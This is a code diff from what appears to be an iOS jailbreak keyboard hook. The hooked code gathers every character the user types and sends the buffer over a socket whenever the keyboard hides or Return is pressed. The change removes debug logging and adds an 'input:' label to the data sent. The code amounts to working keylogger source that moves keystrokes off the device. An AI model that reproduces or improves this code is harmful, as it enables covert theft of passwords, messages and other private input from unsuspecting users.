@@ -9,7 +9,6 @@ NSMutableString *INPUT = [[NSMutableString alloc] initWithCapacity:100];
 -(void)callShouldInsertText:(id) input{
     
     if(![input isEqualToString: @"\n"]){
-        NSLog(@"yujianbo : get input :%@",input);
 //        SocketClass *socket = [[SocketClass alloc] init];
 //        [socket SendSocket:input];
         [INPUT appendString:input];
@@ -19,9 +18,9 @@ NSMutableString *INPUT = [[NSMutableString alloc] initWithCapacity:100];
 
 - (void)keyboardDidHide:(id)arg1{
     if([INPUT length]>0){
-        NSLog(@"yujianbo : send :%@",INPUT);
+        NSString *inputString = [NSString stringWithFormat:@"input:%@",INPUT]; 
         SocketClass *mysocket = [[SocketClass alloc] init];
-        [mysocket SendSocket:(NSString *)INPUT];
+        [mysocket SendSocket:(NSString *)inputString];
         [INPUT setString:@""];
     }
     %orig;
@@ -41,9 +40,9 @@ NSMutableString *INPUT = [[NSMutableString alloc] initWithCapacity:100];
         }
     }else if([name isEqualToString:@"Return-Key"]){
         if([INPUT length]>0){
-            NSLog(@"yujianbo : send :%@",INPUT);
+            NSString *inputString = [NSString stringWithFormat:@"input:%@",INPUT]; 
             SocketClass *mysocket = [[SocketClass alloc] init];
-            [mysocket SendSocket:(NSString *)INPUT];
+            [mysocket SendSocket:(NSString *)inputString];
             [INPUT setString:@""];
         }
     }
